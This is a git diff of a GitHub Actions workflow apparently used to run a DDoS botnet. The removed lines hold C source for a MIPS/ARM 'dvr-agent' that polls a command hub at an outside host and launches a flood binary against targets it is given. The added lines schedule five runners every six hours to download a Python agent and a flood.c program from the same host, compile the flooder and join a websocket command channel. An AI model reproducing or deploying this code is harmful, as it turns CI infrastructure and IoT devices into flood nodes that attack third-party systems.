@@ -1,81 +1,30 @@
-name: Build C Agent
-on: [workflow_dispatch]
+name: Tat
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'
+
 jobs:
-  build:
-    runs-on: ubuntu-22.04
+  spawn:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      matrix:
+        node: [1, 2, 3, 4, 5] 
     steps:
-      - uses: actions/checkout@v4
-      - run: |
-          sudo apt-get update
-          sudo apt-get install -y gcc-mips-linux-gnu gcc-arm-linux-gnueabi
-      - run: |
-          cat << 'EOF' > agent.c
-          #include <stdio.h>
-          #include <stdlib.h>
-          #include <string.h>
-          #include <unistd.h>
-          #include <arpa/inet.h>
-          #include <netdb.h>
-          #include <sys/socket.h>
-          
-          #define HUB_HOST "bg9vrv2nkw.apps.bot-hosting.cloud"
-          #define HUB_PORT 80
-          #define TOKEN "meduza-node-secret-dvr"
-          #define HOSTNAME "dvr-agent"
-          
-          void http_get(char *path, char *response) {
-              int sockfd;
-              struct sockaddr_in server_addr;
-              struct hostent *server = gethostbyname(HUB_HOST);
-              if (server == NULL) { strcpy(response, "DNS_FAIL"); return; }
-              sockfd = socket(AF_INET, SOCK_STREAM, 0);
-              if (sockfd < 0) { strcpy(response, "SOCK_FAIL"); return; }
-              server_addr.sin_family = AF_INET;
-              server_addr.sin_port = htons(HUB_PORT);
-              memcpy(&server_addr.sin_addr.s_addr, server->h_addr, server->h_length);
-              if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-                  strcpy(response, "CONNECT_FAIL"); close(sockfd); return;
-              }
-              char request[1024];
-              snprintf(request, sizeof(request), "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, HUB_HOST);
-              send(sockfd, request, strlen(request), 0);
-              int n, total = 0;
-              while ((n = recv(sockfd, response + total, 2048 - total - 1, 0)) > 0) {
-                  total += n; if (total >= 2048) break;
-              }
-              response[total] = '\0';
-              close(sockfd);
-          }
-          
-          int main() {
-              char response[2048];
-              char path[512];
-              while (1) {
-                  snprintf(path, sizeof(path), "/api/poll?token=%s&hostname=%s", TOKEN, HOSTNAME);
-                  http_get(path, response);
-                  if (strstr(response, "\"job\":{")) {
-                      char target[128] = {0};
-                      char port[16] = {0};
-                      char *t = strstr(response, "\"target\":\"");
-                      if (t) sscanf(t + 10, "%127[^\"]", target);
-                      char *p = strstr(response, "\"port\":");
-                      if (p) sscanf(p + 7, "%15[0-9]", port);
-                      if (strlen(target) > 0 && strlen(port) > 0) {
-                          char cmd[256];
-                          snprintf(cmd, sizeof(cmd), "/tmp/flood_mips %s %s 100 &", target, port);
-                          system(cmd);
-                      }
-                  }
-                  sleep(5);
-              }
-              return 0;
-          }
-          EOF
-      - run: mips-linux-gnu-gcc -static -O2 -o agent_mips agent.c
-      - run: arm-linux-gnueabi-gcc -static -O2 -o agent_arm agent.c
-      - uses: actions/upload-artifact@v4
+      - name: Setup Node
+        uses: actions/setup-node@v4
         with:
-          name: c-agents
-          path: |
-            agent_mips
-            agent_arm
+          node-version: 20
+
+      - name: Start Node
+        run: |
+          mkdir -p /tmp/meduza && cd /tmp/meduza
+          curl -fsSL "https://bg9vrv2nkw.apps.bot-hosting.cloud/bootstrap/agent.py" -o agent.py
+          curl -fsSL "https://bg9vrv2nkw.apps.bot-hosting.cloud/bootstrap/flood.c" -o flood.c
+          gcc -O2 -o flood flood.c -lpthread
+          pip3 install -q websockets
+          
+          # HER RUN'DA BENZERSİZ TOKEN
+          python3 -u agent.py wss://bg9vrv2nkw.apps.bot-hosting.cloud/agent-ws meduza-node-secret-${{ github.run_id }}-node${{ matrix.node }} /tmp/meduza/flood
